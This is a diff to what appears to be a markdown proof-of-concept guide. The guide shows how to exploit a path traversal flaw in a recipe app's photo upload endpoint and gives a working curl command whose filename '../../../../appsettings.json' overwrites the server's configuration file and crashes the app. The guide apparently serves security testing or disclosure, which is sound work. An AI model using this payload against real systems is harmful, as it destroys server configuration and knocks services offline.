@@ -64,35 +64,40 @@ Actual Content: configuration file
 
 3. In the Network tab, look for the POST /api/recipes/.../photo request. Right-click it:
 
-Right-click request → Copy → Copy as cURL (bash)
-This copies the full request — cookies, headers, XSRF token, everything.
+   Right-click request → Copy → Copy as cURL (bash)
+   This copies the full request — cookies, headers, XSRF token, everything.
 
 4. In your terminal, create the file you want to overwrite appsettings.json with:
-
+```
 echo '{"pwned": true}' > pwned.json
+```
+
 5. Modify the curl command — three changes
 
 Change 1 — delete the content-type header. Browser-copied curl includes a hardcoded boundary in the content-type. Using -F makes curl generate its own boundary, causing a conflict that breaks the request body.
-
+```
 -H 'content-type: multipart/form-data; boundary=----WebKitFormBoundary...'
+```
 Do not keep this line. curl sets content-type automatically when using -F.
+
 Change 2 — delete --data-raw. Remove the entire --data-raw $'...' block at the end of the copied command.
 
 Change 3 — add -F with the traversal filename.
-
+```
 -F "photoFile=@pwned.json;filename=../../../../appsettings.json;type=image/png"
 The @pwned.json is the local file to send. The filename= is what the server sees — that's where the traversal happens.
-
+```
 6. Run it and check the response
 
 Your final command should look like this — all original cookies and headers kept, content-type removed, data-raw replaced with -F:
-
+```
 curl -X POST 'https://your-app/api/recipes/10002/photo' \
   -b 'bff=<your cookie>' \
   -H 'accept: application/json, text/plain, */*' \
   -H 'x-xsrf-token: <your token>' \
   -F "photoFile=@pwned.json;filename=../../../../appsettings.json;type=image/png" \
   -v
+```
 A 200 OK response means the file was accepted. The app will crash on next restart — that's your proof of impact.
 
 7. Confirm impact on the server side
